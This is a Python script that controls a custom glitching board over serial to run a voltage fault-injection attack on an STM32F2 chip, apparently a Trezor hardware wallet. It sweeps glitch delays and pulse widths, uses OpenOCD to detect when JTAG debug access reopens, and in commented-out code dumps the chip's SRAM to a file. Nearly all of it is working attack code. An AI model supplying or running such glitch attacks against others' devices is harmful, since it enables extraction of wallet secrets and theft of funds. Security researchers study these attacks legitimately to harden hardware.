#!/usr/bin/env python
# coding: utf-8

import serial
import struct
from tqdm import tnrange, tqdm_notebook
import time
from subprocess import Popen, PIPE

import os
duration = 1  # seconds
freq = 440  # Hz

SERIAL_DEVICE = "/dev/ttyUSB2"
#TARGET_DEVICE = "/dev/ttyUSB0"

POWER_PULSE = 5_000   #3ms
DELAY_FROM = 170_00  #10.044ms
DELAY_TO = 220_00
PULSE_FROM = 23       #1us
PULSE_TO = 28
DELAY_STEP = 1      #1us
PULSE_STEP = 1      #0.1us

device = serial.Serial(SERIAL_DEVICE, baudrate=115200)
#target = serial.Serial(TARGET_DEVICE, baudrate=38400, timeout=0.1)

CMD_TOGGLE_LED = 65
CMD_POWER_CYCLE = 66
CMD_SET_GLITCH_PULSE = 67 # uint32
CMD_SET_DELAY = 68 # uint32
CMD_SET_POWER_PULSE = 69 # uint32
CMD_GLITCH = 70
CMD_READ_GPIO = 71
CMD_ENABLE_GLITCH_POWER_CYCLE = 72 # bool/byte
CMD_GET_STATE = 73 # Get state of device

def cmd_toggle_led(device):
    device.write(chr(CMD_TOGGLE_LED).encode("ASCII"))

def cmd(device, command):
    device.write(chr(command).encode("ASCII"))

def cmd_uint32(device, command, u32):
    device.write(chr(command).encode("ASCII"))
    data = struct.pack(">L", u32)
    device.write(data)

def cmd_uint8(device, command, u8):
    device.write(chr(command).encode("ASCII"))
    data = struct.pack("B", u8)
    device.write(data)

def cmd_read_uint8(device, command):
    device.write(chr(command).encode("ASCII"))
    return device.read(1)[0]

def parse_status(status):
    power_pulse_status = (status >> 6) & 0b11
    trigger_status = (status >> 4) & 0b11
    delay_status = (status >> 2) & 0b11
    glitch_pulse_status = status & 0b11
    print("Power pulse   : " + str(power_pulse_status))
    print("Trigger status: " + str(trigger_status))
    print("Delay status  : " + str(delay_status))
    print("Glitch pulse  : " + str(glitch_pulse_status) + "\r\n")

status = cmd_read_uint8(device, CMD_GET_STATE)
parse_status(status)

cmd_uint32(device, CMD_SET_POWER_PULSE, POWER_PULSE)
cmd_uint32(device, CMD_SET_DELAY, DELAY_FROM)
cmd_uint32(device, CMD_SET_GLITCH_PULSE, PULSE_FROM)
cmd_uint8(device, CMD_ENABLE_GLITCH_POWER_CYCLE, 1)

cmd(device, CMD_GLITCH)
print("Step one, power pulse:")
status = cmd_read_uint8(device, CMD_GET_STATE)
parse_status(status)
time.sleep(1.1)

print("Step two, trigger")
status = cmd_read_uint8(device, CMD_GET_STATE)
parse_status(status)
print("\tWaiting for pin to go low...")
while(status == 0b00010000):
    status = cmd_read_uint8(device, CMD_GET_STATE)
print("\tWaiting for pin to go high...")
while(status == 0b00100000):
    status = cmd_read_uint8(device, CMD_GET_STATE)

print("Step three, delay:")
status = cmd_read_uint8(device, CMD_GET_STATE)
parse_status(status)
time.sleep(1.1)

print("Step four, glitch pulse:")
status = cmd_read_uint8(device, CMD_GET_STATE)
parse_status(status)
time.sleep(1.1)
while(status == 0b00000001):
    status = cmd_read_uint8(device, CMD_GET_STATE)
print("Done, if you get here it means everything is working!")

success = 0
for delay in range(DELAY_FROM, DELAY_TO, DELAY_STEP):
    print("Delay: " + str(delay))
    cmd_uint32(device, CMD_SET_DELAY, delay)
    for pulse in range(PULSE_FROM, PULSE_TO, PULSE_STEP):
        for i  in range(3):
            print(f"pulse: " + str(pulse));
            cmd_uint32(device, CMD_SET_GLITCH_PULSE, pulse)
            cmd(device, CMD_GLITCH)

            # Loop until the status is == 0, aka the glitch is done.
            # This avoids having to manually time the glitch :)
            while(cmd_read_uint8(device, CMD_GET_STATE)):
                pass
            
            #STLink-V2
            # process = Popen(["openocd", "-f", "interface/stlink-v2.cfg", "-f", "target/stm32f2x.cfg", "-c", "init;exit;"], stdout=PIPE, stderr=PIPE)
            # (err, output) = process.communicate()
            # exit_code  = process.wait()
            # if exit_code != 1:
            #     print('Success %d' % success)
            #     success += 1
            #     os.system('play -nq -t alsa synth {} sine {}'.format(duration, freq))
            #     #break
            #     input('Y')

            #JLink
            process = Popen(["openocd", "-f", "interface/jlink-jtag-autotap.cfg", "-f", "target/stm32f2x.cfg"], stdout=PIPE, stderr=PIPE)
            (err, output) = process.communicate()
            exit_code  = process.wait()
            if "0x06411041" in output.decode("utf-8"):
                os.system('play -nq -t alsa synth {} sine {}'.format(duration, freq))
                success += 1
                print('Success %d' % success)
                
                #input('Y?')

                # process2 = Popen(["trezorctl", "list"], stdout=PIPE, stderr=PIPE)
                # (err2, output2) = process2.communicate()
                # exit_code2  = process2.wait()
                # if "self.check_firmware_version" in output2.decode("utf-8"):
                #     process3 = Popen(["openocd", "-f", "interface/jlink.cfg", "-f", "target/stm32f2x.cfg"], stdout=PIPE, stderr=PIPE)
                #     (err3, output3) = process3.communicate()
                #     exit_code3 = process3.wait()
                #     if "0x06411041" in output3.decode("utf-8") or "0x4ba00477" in output3.decode("utf-8"):
                #         process4 = Popen(["openocd", "-f", "interface/jlink-swd.cfg", "-f", "target/stm32f2x.cfg", "-c", "init;dump_image sram_a.bin 0x20000000 131072;exit;"], stdout=PIPE, stderr=PIPE)
                #         (err4, output4) = process4.communicate()
                #         exit_code4 = process4.wait()
                #         print(exit_code4)
                #         input('Next?')
